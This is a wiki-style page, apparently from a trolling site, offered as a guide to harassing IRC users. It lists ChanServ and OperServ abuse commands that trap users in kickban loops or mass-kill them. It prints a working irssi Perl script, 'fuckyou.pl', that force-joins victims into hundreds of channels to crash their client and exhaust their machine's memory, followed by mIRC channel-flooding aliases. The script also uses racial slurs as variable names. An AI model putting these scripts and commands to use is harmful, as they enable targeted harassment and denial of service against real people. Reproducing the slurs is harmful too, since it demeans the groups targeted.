{{stub}}
Here's a little guide for harassing people on irc. Also included are some fun scripts for ircops to play around with. Page limit here we come...

## Trolling ##


* Abuse Channel Mode +f; for example set **/mode #channel +f [1t#b]:999** which will kick pretty much anyone saying anything in the channel.
* Put people in kickban loops; Join a channel, register it with ChanServ, do **/cs akick #channel add *!*@***, leave the channel, now type **//raw join #channel $crlf mode #channel +e ~c:#(a channel that the targeted user is on) $crlf invite TargetUser #channel** and watch.
* Abuse ChanServ privileges; a fun thing to do is clearing out the entire channel by doing /cs clear #channel users which kicks everyone from the channel. Alternatively, to cause more destruction, do **/cs akick #channel add *!*@*** then **/mode #channel +e ~c:(a channel alot of people in the channel are also on)** then **/cs akick #channel enforce**. This will send everyone in the target channel that is on the alternate channel you specified into an infinite kickban loop, as well as clearing everyone else out. (Note: On most servers you must use an extban ~c: because ChanServ will detect normal except masks and remove them)
* Abuse OperServ; go onto a populated channel and type **/os akillchan kill +0 #channel Hi2u**

## Scripts ##

Unless noted, these require you to have ircop access on the network you are on. Feel free to update and add in other working scripts.

### irssi ###


#### fuckyou.pl ####

A Fuckyou is where your client, by way of the forcejoin/sajoin module available in some IRC daemons, is forced to join several hundred channels. Usually this will crash your IRC client at some absurd amount of channels, like 200. The primary method of being dealt a fuckyou is by way of the Irssi fuckyou.pl script.
One of the best uses of fuckyou.pl is to grow the amount of channels on an idle GUI client slowly as to not flood the victim off until the client allocates all the available ram and swap in a machine, resulting in the user returning to a terminal that has ground itself to a halt. 

##### Fuckyou.pl in action #####

<pre>
07:59 !bantown.hub *** Notice -- weev used SAJOIN to make etruscan join #LOL_DONGS_bdf4d9efb3179cc6ad46e
07:59 !bantown.hub *** Notice -- weev used SAJOIN to make etruscan join #LOL_DONGS_effbf8d150b38128b2b62
(insert 3000 lines)
07:59 !bantown.hub *** Notice -- weev used SAJOIN to make etruscan join #LOL_DONGS_15158ae015f7d04ba0b3d
07:59 !bantown.hub *** Notice -- weev used SAJOIN to make etruscan join #LOL_DONGS_325dbf466a613ae9f41cd
</pre>


##### The codes #####

<pre>
use Irssi;
use Irssi::Irc;
use Time::HiRes qw(time);
use Digest::MD5 qw(md5_hex);


#__        ___    ____  _   _ ___ _   _  ____   _   _ ____ ___ _   _  ____ 
#\ \      / / \  |  _ \| \ | |_ _| \ | |/ ___| | | | / ___|_ _| \ | |/ ___|
# \ \ /\ / / _ \ | |_) |  \| || ||  \| | |  _  | | | \___ \| ||  \| | |  _ 
#  \ V  V / ___ \|  _ <| |\  || || |\  | |_| | | |_| |___) | || |\  | |_| |
#   \_/\_/_/   \_\_| \_\_| \_|___|_| \_|\____|  \___/|____/___|_| \_|\____|
#                                                                          
# _____ _   _ _____ ____  _____   ____   ____ ____  ___ ____ _____ ____  
#|_   _| | | | ____/ ___|| ____| / ___| / ___|  _ \|_ _|  _ \_   _/ ___| 
#  | | | |_| |  _| \___ \|  _|   \___ \| |   | |_) || || |_) || | \___ \ 
#  | | |  _  | |___ ___) | |___   ___) | |___|  _ < | ||  __/ | |  ___) |
#  |_| |_| |_|_____|____/|_____| |____/ \____|_| \_\___|_|    |_| |____/ 
#                                                                        
# __  __    _ __   __  ____  _____    _    _     _  __   __
#|  \/  |  / \\ \ / / |  _ \| ____|  / \  | |   | | \ \ / /
#| |\/| | / _ \\ V /  | |_) |  _|   / _ \ | |   | |  \ \// 
#| |  | |/ ___ \| |   |  _ <| |___ / ___ \| |___| |___| |  
#|_|  |_/_/   \_\_|   |_| \_\_____/_/   \_\_____|_____|_|  
#                                                          
# _____ _   _  ____ _  _____ _   _  ____      _    _   _ _   _  _____   __
#|  ___| | | |/ ___| |/ /_ _| \ | |/ ___|    / \  | \ | | \ | |/ _ \ \ / /
#| |_  | | | | |   | ' / | ||  \| | |  _    / _ \ |  \| |  \| | | | \ V / 
#|  _| | |_| | |___| . \ | || |\  | |_| |  / ___ \| |\  | |\  | |_| || |  
#|_|    \___/ \____|_|\_\___|_| \_|\____| /_/   \_\_| \_|_| \_|\___/ |_|  
#                                                                         
#__   _____  _   _ ____    _   _ ____  _____ ____  ____  
#\ \ / / _ \| | | |  _ \  | | | / ___|| ____|  _ \/ ___| 
# \ V / | | | | | | |_) | | | | \___ \|  _| | |_) \___ \ 
#  | || |_| | |_| |  _ <  | |_| |___) | |___|  _ < ___) |
#  |_| \___/ \___/|_| \_\  \___/|____/|_____|_| \_\____/ 
                                                        

use vars qw($VERSION %IRSSI); $VERSION = "2.1";
%IRSSI = (
authors => "Goat-See",
contact => "mrtheplague@gmail.com",
name => "fuckyou",
description => "/fuckyou NICK numberchannels",
license => "urmom",
url => "http://www.buttes.org/",
);

my $FORCEPART = "sapart"; # Change these if your ircd is not gay/unreal and uses
my $FORCEJOIN = "sajoin"; # forcejoin and forcepart as the command

my $FURRY = "fuck_you";
sub cmd_fuckyou
{
        my ($data, $server, $dest) = @_;
        my ($nick, $amt_end) = split(/ +/, $data);
        unless($nick && $amt_end)
        {
            Irssi::print("/fuckyou <nick> <amt>");
            return;
        }

        for(1 .. $amt_end)
        {
            my $nig = md5_hex($$ * time * $_);
            $server->command("$FORCEJOIN $nick #${FURRY}_$nig");
        }
}

sub cmd_unfuckyou
{
    my ($data, $server, $channel)= @_;
    return Irssi::print("/unfuckyou user user2 user3") unless $data;
    foreach my $dick (split(" ", $data))
    {
            @niggers=();
            $server->redirect_event(
                "whois", 1, $dick, 0, 
                undef,
                {
                    "event 319" => "redir autowhois_channels",
                    "" => "event empty"
                }
            );
            $server->send_raw("WHOIS :$dick");
    }
}

sub event_whois_channels
{
    my ($server, $data) = @_;
    my ($num, $nick, $channels) = split(/ +/, $data, 3);
    my @niggers = ();
    my $counter=0;

    $channels =~ s/^://;
    $channels =~ s/[ ]{1,}$//;

    @niggers = split(' ', $channels);
    foreach (@niggers)
    {
        s/[@%+]([&#])/$1/;
        if(/[&#](fuck_you|owned_by_penisbird|$FURRY)_[a-f0-9]+/i)
        {
            #Irssi::print("Forceparting $nick from $_");
            $server->send_raw("$FORCEPART $nick $_");
            $counter++;
        }
    }
    Irssi::print("Forceparted $nick from $counter channels") if $counter;
}

Irssi::command_bind('fuckyou', 'cmd_fuckyou');
Irssi::command_bind('unfuckyou', 'cmd_unfuckyou');
Irssi::signal_add(
{
    'redir autowhois_channels'      => \&event_whois_channels,
});
</pre>


### mIRC ###


#### flooder ####

Assorted flooding scripts. These are good if there's no flood limit or if you have the flag "can_flood"

##### The Codes #####

<pre>
;;Deviance Presents: Flood Shit and stuff.
:; /flood1 <text>
;; Color texted /flood2 <text>
;; others = /blizzard /bsod /dude /propane
;; Enjoy
alias blizzard {
  /msg $chan �1,1DBRDLBZZRLBDRIAIZIIRL�2,1AZ�1,1LZD�
  /msg $chan �1,1RIBZDZZA�0,1IZBRLDBZI�1,1IZ�2,1ZD�12,1L�2,1BA�1,1BZ�
  /msg $chan �1,1BBLAZ�2,1LZ�1,1Z�0,1DIDDRAZAZL�12,1IBR�2,1R�1,1DAAZ�
  /msg $chan �1,1ILDZR�2,1B�12,1Z�2,1A�0,1ZZAA�1,1BB�0,1BZLD�12,1I�2,1B�1,1BRDAAI�
  /msg $chan �1,1ZZADRZ�2,1D�12,1B�0,1RABI�1,1Z�2,1B�12,1L�0,1ZABI�1,1BBAIDIA�
  /msg $chan �1,1IZAZAZZ�2,1A�0,1IILIAAZBZRR�1,1LARAZLB�
  /msg $chan �1,1BRIRZIZB�0,1ZAZDIDZBLIIL�1,1BDBBIR�
  /msg $chan �1,1AAZRRIBR�0,1BRZR�12,1R�1,1ILI�0,1ZLAZ�1,1LRLRLZ�
  /msg $chan �1,1RDDLLAA�2,1D�0,1LLDB�1,1IBB�0,1IZZZB�1,1AZBIZR�
  /msg $chan �1,1BIDBZA�2,1Z�12,1Z�0,1ZRRZZBDAZADR�1,1DBRZZB�
  /msg $chan �1,1IRZLAA�2,1D�12,1D�0,1RAAZLBLDZBA�1,1DZBRDRI�
  /msg $chan �1,1RILBA�2,1DZ�12,1Z�1,1ZLLZDA�2,1BI�12,1A�2,1A�1,1ZZADRDAI�
  /msg $chan �1,1RZLAZ�2,1I�12,1R�2,1I�1,1I�0,1ARADI�1,1DB�2,1Z�12,1L�2,1Z�1,1RRZDDAL�
  /msg $chan �1,1LRDZL�2,1R�12,1A�2,1I�1,1A�0,1RIZDR�1,1LBZ�2,1I�12,1R�2,1I�1,1ZAZDLR�
  /msg $chan �1,1AIIBA�2,1Z�12,1B�2,1B�1,1B�0,1RBADL�1,1LLLD�2,1Z�12,1Z�2,1R�1,1IIADR�
  /msg $chan �1,1LZADL�2,1Z�12,1Z�2,1I�1,1L�0,1ZARZI�1,1RDDLB�2,1Z�12,1R�2,1Z�1,1ZBDI�
  /msg $chan �1,1LZBIZ�2,1R�12,1B�2,1A�1,1L�0,1AZDLR�1,1RBLZB�2,1D�12,1R�2,1A�1,1ZZZL�
  /msg $chan �1,1IDIBAB�2,1D�12,1Z�1,1Z�0,1IILDZ�1,1ALIIRA�2,1A�12,1B�2,1A�1,1ZAR�
  /msg $chan �1,1ZLZBAA�2,1Z�12,1R�2,1L�0,1BBDZA�1,1DZLIZB�2,1Z�12,1Z�2,1D�1,1RDD�
  /msg $chan �1,1ZALDRI�2,1Z�12,1L�2,1A�0,1lDZIL�1,1ZZDLAZ�2,1R�12,1Z�2,1A�1,1DZI�
  /msg $chan �1,1ZBIZDZR�2,1L�12,1A�2,1D�0,1BIBZZIIAR�1,1A�2,1A�12,1D�2,1L�1,1DRD�
  /msg $chan �1,1BDADIIB�2,1L�12,1BB�0,1DZDAARZBI�1,1I�2,1A�12,1D�2,1B�1,1AZB�
  /msg $chan �1,1ZIZRALBB�2,1L�12,1DB�0,1DZIDLAAB�2,1Z�12,1Z�2,1I�1,1AZDR�
  /msg $chan �1,1RDDLADIZ�2,1D�12,1L�2,1R�1,1ZBBZDZRA�2,1I�12,1Z�2,1A�1,1IRZR�
  /msg $chan �1,1IIIIZDRRI�2,1D�12,1ID�0,1ZLAZ�1,1ZZ�2,1Z�12,1I�2,1I�1,1ZZBZD�
  /msg $chan �1,1LZDLARRIIL�2,1R�12,1Z�0,1ZIIR�1,1Z�2,1L�12,1I�2,1Z�1,1LDRZDB�
  /msg $chan �1,1ZIDZRRIALZ�2,1B�12,1R�0,1IZAD�2,1R�12,1Z�2,1B�1,1BAIZIZB�
  /msg $chan �1,1ILBRDBZARZA�12,1Z�0,1IZZA�12,1R�2,1Z�1,1DRIIBDRB�
  /msg $chan �1,1DBZLBLZZILZZ�0,1LDAR�2,1B�1,1ZILRARZBD�
  /msg $chan �1,1DIBAZLDZRLLZ�0,1BIAR�1,1IZZZDBRDAR�
  /msg $chan �1,1RZRZAIRIBBAZ�0,1LIRZ�2,1Z�1,1LBAZRZILR�
  /msg $chan �1,1RBZAZDIIZL�2,1I�12,1Z�0,1RDBD�12,1I�2,1L�1,1LABRBABZ�
  /msg $chan �1,1LZILBZZL�2,1LD�12,1RA�0,1ZBDR�12,1Z�2,1B�1,1ZDLAZDZD�
  /msg $chan �1,1ZZZZBLZ�2,1Z�12,1Z�2,1IB�1,1L�0,1DLLB�2,1D�12,1B�2,1D�1,1DIZZLLR�
  /msg $chan �1,1RZDIZR�2,1L�12,1Z�2,1L�1,1IRDAALLA�2,1Z�12,1L�2,1I�1,1DZBLRA�
  /msg $chan �1,1BDRBA�2,1B�12,1A�2,1I�0,1LZZDZLBBB�2,1B�12,1Z�2,1D�0,1D�1,1ABZZZ�
  /msg $chan �1,1DRDL�2,1B�12,1Z�2,1D�0,1lBBRBZZLIBZ�2,1B�12,1L�2,1L�1,1ZARAR�
  /msg $chan �1,1DAI�2,1B�12,1L�2,1B�1,1R�0,1AAZDLRLZARAZ�12,1Z�2,1B�1,1BDDDI�
  /msg $chan �1,1IB�2,1D�12,1I�2,1L�1,1LDLDBDAR�0,1IALAZ�12,1ZZ�2,1R�1,1ADARD�
  /msg $chan �1,1AL�2,1L�12,1Z�2,1Z�1,1DLDLDZL�0,1ZIBBZL�2,1R�12,1L�2,1Z�1,1IZRLZ�
  /msg $chan �1,1B�2,1Z�12,1B�2,1I�1,1IAZZAAI�0,1ZILBBZ�1,1B�2,1R�12,1D�2,1L�1,1LBBLA�
  /msg $chan �1,1I�2,1A�12,1R�2,1R�1,1ADABZL�0,1RZRZZL�1,1ZA�2,1R�12,1D�2,1R�1,1RAZRR�
  /msg $chan �1,1I�2,1Z�12,1Z�2,1D�1,1RZRDA�0,1RDDZBB�1,1LAA�2,1Z�12,1L�2,1L�1,1RDADD�
  /msg $chan �1,1L�2,1Z�12,1L�2,1B�1,1DZDB�0,1LZIZDALZB�2,1B�12,1R�2,1Z�1,1LAIDDZ�
  /msg $chan �1,1IL�2,1D�12,1Z�2,1Z�1,1AD�0,1ABALRDALLB�2,1Z�12,1I�2,1Z�1,1ZLRZII�
  /msg $chan �1,1ZA�2,1I�12,1L�2,1L�1,1Z�0,1DDIABAIZLR�2,1A�12,1R�2,1R�0,1Z�1,1DIZRZD�
  /msg $chan �1,1RAR�2,1Z�12,1D�2,1R�1,1LZIAAZBRR�2,1D�12,1R�2,1D�1,1AAIZZZZA�
  /msg $chan �1,1AZIZ�2,1A�12,1Z�2,1D�0,1RIBALIB�2,1D�12,1BI�0,1ZDRB�1,1BZRRL�
  /msg $chan �1,1ZLDAL�2,1ZZ�0,1ZZIAZZ�2,1I�12,1I�2,1Z�0,1AIDL�1,1ZAAAAZ�
  /msg $chan �1,1AZADRAI�0,1BBADR�12,1DR�2,1L�0,1LBZA�1,1DLRBRBZ�
  /msg $chan �1,1DDBIABDDL�2,1Z�12,1A�2,1A�12,1LZ�0,1ZLLR�1,1DZAIZZDL�
  /msg $chan �1,1LAARZLLZAL�2,1D�12,1IB�0,1RRLZ�1,1IZBRBZZDI�
  /msg $chan �1,1ZIRRAAZIR�2,1I�12,1IB�0,1DRDZ�1,1AABBDZBIZZ�
  /msg $chan �1,1LIIDARAL�2,1DZ�12,1A�0,1DADR�12,1A�2,1R�1,1BAIAIDRZA�
  /msg $chan �1,1RBBBZDL�2,1R�12,1RL�0,1ZRDZ�12,1ZZB�2,1A�1,1BAZZZZRI�
  /msg $chan �1,1ZBZZZR�2,1L�12,1ZZ�0,1DLDZZBRZZ�0,1ZZ�1,1LBZDBR�
  /msg $chan �1,1RZZDL�2,1R�12,1RL�0,1ZILDBLZBZLZR�2,1B�1,1ZABDZ�
  /msg $chan �1,1DBIL�2,1D�12,1ZA�0,1ZDAZZLZZAIDZA�2,1LL�1,1IBBZ�
  /msg $chan �1,1BZRZ�2,1L�12,1Z�2,1L�1,1AIRRAABAALZZ�2,1IZBR�1,1DDZ�
  /msg $chan �1,1AAI�2,1A�12,1A�2,1D�1,1BAZRAB�0,1BRBL�1,1RRLA�2,1IBIA�1,1ZA�
  /msg $chan �1,1LZ�2,1I�12,1Z�2,1I�1,1RARBBR�0,1ALLBLD�1,1ZRAL�2,1B�12,1A�2,1D�1,1ZB�
  /msg $chan �1,1RA�2,1R�12,1B�2,1Z�1,1DZBII�0,1IAIZRIZL�1,1ILAR�2,1L�12,1I�2,1D�1,1L�
  /msg $chan �1,1L�2,1I�12,1Z�2,1D�1,1ZBLRA�0,1LIZAIIZRDD�1,1ZRL�2,1Z�12,1R�2,1B�1,1I�
  /msg $chan �1,1R�2,1A�12,1D�2,1Z�1,1ZZAZ�0,1LIZAD�1,1ZD�0,1LZRZA�1,1BR�2,1R�12,1A�2,1D�1,1I�
  /msg $chan �1,1R�2,1A�12,1I�2,1D�1,1AID�0,1IZRZZ�1,1AADD�0,1ZZRZR�1,1Z�2,1A�12,1I�2,1L�1,1Z�
  /msg $chan �1,1Z�2,1A�12,1Z�2,1A�1,1AZ�0,1ZLLRBBZBILIADII�2,1L�12,1Z�2,1D�1,1RB�
  /msg $chan �1,1L�2,1A�12,1L�2,1Z�1,1B�0,1RZDZZZLBRIAIIBDB�2,1Z�12,1R�2,1Z�1,1ZI�
  /msg $chan �1,1R�2,1D�12,1I�2,1D�1,1A�0,1BIRILDDAZZRZLIL�2,1Z�12,1B�2,1I�1,1DAZ�
  /msg $chan �1,1R�2,1Z�12,1R�2,1I�1,1B�0,1RZILA�1,1AIZDBII�0,1RZR�2,1A�12,1Z�2,1Z�1,1BBI�
  /msg $chan �1,1B�2,1A�12,1D�2,1R�1,1R�0,1ZZDRL�1,1ZZAZDZB�0,1RA�2,1D�12,1Z�2,1R�1,1RZBL�
  /msg $chan �1,1D�2,1R�12,1Z�2,1A�1,1RDRLZRZZZDZBZAA�2,1D�12,1Z�2,1Z�1,1ADRL�
  /msg $chan �1,1IZ�2,1A�12,1A�1,1BIL�0,1DADRZZAZZI�1,1B�2,1Z�12,1I�2,1R�1,1LABDZ�
  /msg $chan �1,1BR�2,1L�12,1I�2,1D�1,1RZ�0,1BZZZDZRAZZZ�12,1A�2,1B�1,1DLZLLA�
  /msg $chan �1,1DZ�2,1R�12,1D�2,1A�1,1ZB�0,1DBILLBIRZBAZ�1,1AZBLRZA�
  /msg $chan �1,1BZZ�2,1A�12,1Z�2,1A�1,1A�0,1DLZZA�1,1ADZ�0,1ILRAL�1,1BBAZZZ�
  /msg $chan �1,1BAA�2,1D�12,1A�2,1R�1,1D�0,1BABZZ�1,1RZ�2,1R�0,1ZZZIL�1,1RLLLDZ�
  /msg $chan �1,1AZBZ�2,1Z�12,1D�2,1Z�1,1�0,1BDDZZALAZZZZ�1,1RDRLZZI�
  /msg $chan �1,1ADBZA�2,1B�12,1Z�2,1�0,1BABZBIRZZZL�1,1IBRZBRZA�
  /msg $chan �1,1ZLDBD�2,1IR�12,1�0,1IZDIZ�12,1Z�0,1RZBBI�1,1RILDIIBI�
  /msg $chan �1,1LLZBDIR�2,1�0,1BZLLR�2,1D�1,1R�0,1RDIDA�1,1ZIRDRLD�
  /msg $chan �1,1ARZDDLL�0,1RBBZZ�1,1ZA�1,1I�0,1BARAZ�1,1ARBZLD�
  /msg $chan �1,1ZZIALZR�0,1ARZBB�2,1IZ�1,1L�1,1D�0,1RRRZA�1,1AILDZ�
  /msg $chan �1,1RALIZID�2,1A�12,1D�2,1Z�1,1R�2,1D�12,1R�2,1BZ�1,1DAAZZLLIBBZ�
  /msg $chan �1,1BDDIAB�2,1B�12,1DD�0,1ZRB�2,1A�12,1D�2,1DL�0,1L�1,1LZIRZRRZZ�
  /msg $chan �1,1RBZD�2,1DB�12,1D�2,1A�0,1LZZID�2,1R�12,1I�2,1ZB�0,1IA�1,1RLZZZAA�
  /msg $chan �1,1RAI�2,1A�12,1BI�2,1D�0,1AZRILBB�2,1Z�12,1AB�2,1A�0,1ZB�1,1BLLRAZ�
  /msg $chan �1,1ZZZ�2,1ZZZ�1,1A�0,1ALRDI�1,1RRA�0,1B�2,1L�12,1D�2,1L�0,1LZ�1,1IDBAZ�
  /msg $chan �1,1ZIZLALR�0,1ZDBLA�1,1IAZR�0,1L�2,1L�12,1A�2,1ZL�1,1RIZBA�
  /msg $chan �1,1ZZDRBRD�0,1RLZZA�1,1DBBA�0,1ZI�2,1Z�12,1RI�2,1B�1,1DIRZ�
  /msg $chan �1,1ZABZRBZ�0,1ZZDLR�1,1RAZL�0,1ZBI�2,1B�12,1ZA�2,1D�1,1RIB�
  /msg $chan �1,1IAZBZBB�0,1ZZARB�1,1RIB�0,1ADABA�2,1Z�12,1ZI�2,1Z�1,1BA�
  /msg $chan �1,1AZAAAZZ�0,1LBRRZDZZLLILZ�1,1R�2,1A�12,1BZ�2,1D�1,1D�
  /msg $chan �1,1DLDZBIA�0,1ABRZZLBBAIRD�1,1ARI�2,1ZBL�1,1B�
  /msg $chan �1,1DZIZZRD�0,1ARBRADBIRD�1,1DZAZDZLDI�
}

alias dude {
  /msg $chan �9,9xxxxxxxxxxxxxxxxxxxxxxx�1,1xxxxxxxxx�9,9xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxxxxxxxxxxxx�1,1xxxxxxxxxxx�9,9xxxxxxxxxxxxxxxxxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxxxxxxxxxx�1,1xxxxxxxxxxxxxx�9,9xxxxxxxxxxxxxxxxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxxxxxxxxxx�1,1xxx�0,0xxx�1,1xxx�0,0xxx�1,1xx�9,9xxxxxxxxxxxxxxxxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxxxxxxxxxx�1,1xxxxxxxxxxxxxx�9,9xxxxxxxxxxxxxxxxxxxxxxxxxxxx�
  /msg $chan �9,9xx�1,1xxxxxx�9,9xxxxxxxxxxxx�1,1xxxxxxxxxxxxxx�9,9xxxxxxxxxx�1,1xxxxxx�9,9xxxxxxxxxxxx�
  /msg $chan �9,9xx�1,1xxxxxx�9,9xxxxxxxxxxxx�1,1xxxxxxxxxxxxxx�9,9xxxxxxxxxx�1,1xxxxxx�9,9xxxxxxxxxxxx�
  /msg $chan �1,1xxxxxxxxxx�9,9xxxxxxxxxxxx�1,1xx�4,4xxxxxxxx�1,1xx�9,9xxxxxxxxxx�1,1xxxxxxxx�9,9xxxxxxxxxx�
  /msg $chan �1,1xxxxxxxxxx�9,9xxxxxxxxxxxx�1,1xxxxxxxxxxxx�9,9xxxxxxxxxx�1,1xxxxxxxxxx�9,9xxxxxxxx�
  /msg $chan �1,1xxxxxxxxxx�9,9xxxxxxxxxxxxx�1,1xxxxxxxxxxxxx�9,9xxxxxxxx�1,1xxxxxxxxxx�9,9xxxxxxxx�
  /msg $chan �1,1xxxxxxxxxx�9,9xxxxxxxx�12,12xxxxxx�1,1xxxxxxxxxx�12,12xxxxxx�9,9xxxx�1,1xxxxxxxxxxxx�9,9xxxxxx�
  /msg $chan �1,1xxxxxxxxxx�9,9xxxx�12,12xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�9,9xxxx�1,1xxxxxxxx�9,9xxxxxx�
  /msg $chan �1,1xxxxxxxx�9,9xxxx�12,12xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�9,9xxxx�1,1xxxxxx�9,9xxxxxx�
  /msg $chan �1,1xxxxxx�9,9xxxx�12,12xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�9,9xxxx�1,1xxxxxx�9,9xxxx�
  /msg $chan �1,1xxxxxx�9,9xx�12,12xxxxxxxxxxxxxxxxxx�0,0xx�12,12xxxxxxxx�0,0xxxx�12,12xxxxxxxxxx�9,9xx�1,1xxxxxxxx�9,9xx�
  /msg $chan �1,1xxxxxx�12,12xxxxxxxxxxxxxxxxxxxx�0,0xxxx�12,12xxxx�0,0xxxxxxxx�12,12xxxxxxxxxx�1,1xxxxxxxxxx�
  /msg $chan �1,1xxxxxx�12,12xxxxxxxxxxxxxxxxxxxx�0,0xxxxxx�12,12xx�0,0xx�12,12xxxx�0,0xx�12,12xxxxxxxxxxxx�1,1xxxxxxxx�
  /msg $chan �1,1xxxxxx�12,12xxxxxxxxxxxxxxxxxxxxxx�0,0xxxx�12,12xx�0,0xxxxxxxx�12,12xxxxxxxxxxxx�1,1xxxxxxxx�
  /msg $chan �1,1xxxxxx�12,12xxxxxxxxxxxxxxxxxxxxxxxx�0,0xx�12,12xxxx�0,0xxxx�12,12xxxxxxxxxxxxxx�1,1xxxxxxxx�
  /msg $chan �1,1xxxx�12,12xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�1,1xxxxxxxx�
  /msg $chan �1,1xxxxxx�12,12xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�1,1xxxxxxxx�
  /msg $chan �1,1xxxxxx�12,12xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�1,1xxxxxxxx�
  /msg $chan �1,1xxxxxx�12,12xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�9,9xxxx�1,1xxxxxx�9,9xx�
  /msg $chan �1,1xxxxxx�12,12xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�9,9xxxxxxxxxxxx�
  /msg $chan �1,1xxxxxx�12,12xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�9,9xxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxx�12,12xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�9,9xxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxx�12,12xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�9,9xxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxx�12,12xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�9,9xxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxx�12,12xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�9,9xxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxx�12,12xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�9,9xxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxx�12,12xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�9,9xxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxx�12,12xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�9,9xxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxx�12,12xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�9,9xxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxx�12,12xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�9,9xxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxx�12,12xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�9,9xxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxx�12,12xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�9,9xxxxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxx�12,12xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�9,9xxxxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxx�12,12xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�9,9xxxxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxx�12,12xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�9,9xxxxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxxxx�12,12xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx�9,9xxxxxxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxxxx�10,10xxxxxxxxxxxx�14,14xx�10,10xxxxxxxxxxxxxxxx�9,9xxxxxxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxxxx�10,10xxxxxxxxxxxx�14,14xx�10,10xxxxxxxxxxxxxxxx�9,9xxxxxxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxxxx�10,10xxxxxxxxxxxx�14,14xx�10,10xxxxxxxxxxxx�14,14xx�10,10xx�9,9xxxxxxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxxxx�14,14xx�10,10xxxxxxxxxx�14,14xx�10,10xxxxxxxxxxxx�14,14xx�10,10xx�9,9xxxxxxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxxxx�14,14xx�10,10xxxxxxxxxx�14,14xx�10,10xxxxxxxxxxxx�14,14xxxx�9,9xxxxxxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxxxx�14,14xx�10,10xxxxxxxxxx�14,14xx�10,10xxxxxxxxxxxx�14,14xxxx�9,9xxxxxxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxxxx�14,14xx�10,10xxxxxxxxxx�14,14xx�10,10xxxxxxxxxxxx�14,14xxxx�9,9xxxxxxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxxxx�14,14xx�10,10xxxxxxxxxx�14,14xx�10,10xxxxxxxxxxxx�14,14xxxx�9,9xxxxxxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxxxx�14,14xx�10,10xxxxxxxxxx�14,14xx�10,10xxxxxxxxxxxx�14,14xxxx�9,9xxxxxxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxxxxxx�10,10xxxxxxxxxx�14,14xx�10,10xxxxxxxxxx�14,14xxxxxx�9,9xxxxxxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxxxxxx�10,10xxxxxxxxxx�14,14xx�10,10xxxxxxxxxx�14,14xxxxxx�9,9xxxxxxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxxxxxx�10,10xxxxxxxxxx�14,14xx�10,10xxxxxxxxxx�14,14xxxxxx�9,9xxxxxxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxxxxxx�10,10xxxxxxxxxx�14,14xx�10,10xxxxxxxxxx�14,14xxxxxx�9,9xxxxxxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxxxxxx�10,10xxxxxxxxxx�14,14xx�10,10xxxxxxxxxx�14,14xxxx�10,10xx�9,9xxxxxxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxxxxxx�10,10xxxxxxxxxx�14,14xx�10,10xxxxxxxxxx�14,14xxxx�10,10xx�9,9xxxxxxxxxxxxxxxxxx�
